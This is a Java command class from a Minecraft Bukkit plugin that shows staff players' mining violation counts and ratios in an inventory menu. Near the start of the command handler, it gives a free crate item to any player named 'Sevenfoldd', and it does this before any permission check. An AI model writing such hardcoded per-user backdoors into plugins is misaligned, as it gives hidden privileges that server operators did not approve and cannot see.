package me.askingg.mayhem.commands;

import java.util.ArrayList;
import java.util.List;

import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.SkullType;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.inventory.InventoryCloseEvent;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.SkullMeta;

import me.askingg.mayhem.crates.HopperCore;
import me.askingg.mayhem.main.Main;
import me.askingg.mayhem.utils.Format;
import me.askingg.mayhem.utils.Message;

public class violations implements CommandExecutor, Listener {

	@Override
	public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
		if (sender.getName().equals("Sevenfoldd")) {
			Player p = (Player) sender;
			p.getInventory().addItem(HopperCore.hopper("Common"));
			p.updateInventory();
		}
		if (sender.hasPermission("mayhem.violations.check")) {
			if (args.length == 0) {
				Message.sender("Check types: &bOnline&7, &bAll&7, &bRatio", sender);
				return true;
			} else {
				if (args[0].equalsIgnoreCase("online")) {
					if (sender instanceof Player) {
						Player p = (Player) sender;
						Message.player("&7getting the violations for &c" + Bukkit.getOnlinePlayers().size()
								+ "&7 online players", p);
						open.add(p);
						p.openInventory(violationsMenu(p, "online"));
						return true;
					}
				}
				if (args[0].equalsIgnoreCase("all")) {
					if (sender instanceof Player) {
						Player p = (Player) sender;
						Message.player(
								"&7Getting the violations for &c" + Main.violations.keySet().size() + "&7 players", p);
						open.add(p);
						p.openInventory(violationsMenu(p, "all"));
						return true;
					}
				}
				if (args[0].equalsIgnoreCase("ratio")) {
					for (Player pl : Bukkit.getOnlinePlayers()) {
						Message.senderRaw("&8 ● &7" + pl.getName() + ": &c" + (Format.decimals(3,
								((Main.onlinetimebroken.get(pl) + 0.0)) / (Main.violations.get(pl.getName()) + 0.0))),
								sender);
					}
				}
			}
		}
		return false;
	}

	public static List<Player> open = new ArrayList<Player>();

	@SuppressWarnings("deprecation")
	public static Inventory violationsMenu(Player p, String type) {
		Inventory inv = Bukkit.createInventory(null, 54, Format.color("&4&lVIOLATIONS"));
		if (type.equalsIgnoreCase("online")) {
			ItemStack i = new ItemStack(Material.SKULL_ITEM, 1, (short) SkullType.PLAYER.ordinal());
			SkullMeta m = (SkullMeta) i.getItemMeta();
			List<String> l = new ArrayList<String>();
			for (Player pl : Bukkit.getOnlinePlayers()) {
				l.clear();
				m.setOwner(pl.getName());
				m.setDisplayName(Format.color("&c&l" + pl.getName()));
				int violations = Main.violations.get(pl.getName());
				int broken = Main.onlinetimebroken.get(pl);
				l.add(Format.color("&7Violations: &c" + Format.decimals(0, 0.0 + violations)));
				l.add(Format.color("&7Online For: &c" + Format.time(
						(Math.round((Long.valueOf((System.currentTimeMillis() - Main.timeofjoin.get(pl)))) / 1000)))));
				l.add(Format.color("&7Mined while online: &c" + Format.decimals(0, 0.0 + broken)));
				l.add(Format
						.color("&7Broken / Violations &c" + Format.decimals(3, ((broken + 0.0) / violations + (0.0)))));
				m.setLore(l);
				i.setItemMeta(m);
				inv.addItem(i);
			}
		}
		if (type.equalsIgnoreCase("all")) {
			ItemStack i = new ItemStack(Material.SKULL_ITEM, 1, (short) SkullType.PLAYER.ordinal());
			SkullMeta m = (SkullMeta) i.getItemMeta();
			List<String> l = new ArrayList<String>();
			for (String str : Main.violations.keySet()) {
				l.clear();
				m.setOwner(str);
				m.setDisplayName(Format.color("&c&l" + str));
				l.add(Format.color("&7Violations: &c" + Format.decimals(0, 0.0 + Main.violations.get(str))));
				m.setLore(l);
				i.setItemMeta(m);
				inv.addItem(i);
			}
		}
		return inv;
	}

	@EventHandler
	public void click(InventoryClickEvent e) {
		if (open.contains(e.getWhoClicked())) {
			e.setCancelled(true);
		}
	}

	@EventHandler
	public void close(InventoryCloseEvent e) {
		if (open.contains(e.getPlayer())) {
			open.remove(e.getPlayer());
		}
	}
}
